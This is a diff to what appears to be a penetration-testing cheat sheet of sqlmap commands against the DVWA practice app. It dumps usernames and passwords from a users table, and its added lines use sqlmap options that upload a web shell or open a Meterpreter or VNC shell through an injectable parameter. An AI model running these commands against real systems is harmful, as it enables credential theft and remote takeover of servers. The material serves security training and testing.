@@ -53,7 +53,14 @@ sqlmap -r nameoffiletoinject -D dwva -T users --dump
 
 # Get columns username and password of table users from table dwva
 sqlmap -r nameoffiletoinject -D dwva -T users -C username,password --dump
+
+# Automatically attempt to upload a web shell using the vulnerable parameter and execute it
+sqlmap -r nameoffiletoinject -p vuln-param -os-shell 
+
+# Alternatively use the os-pwn option to gain a shell using meterpreter or vnc 
+sqlmap -r nameoffiletoinject -p vuln-param -os-pwn 
 ```
+
 
 ## Using URL
 
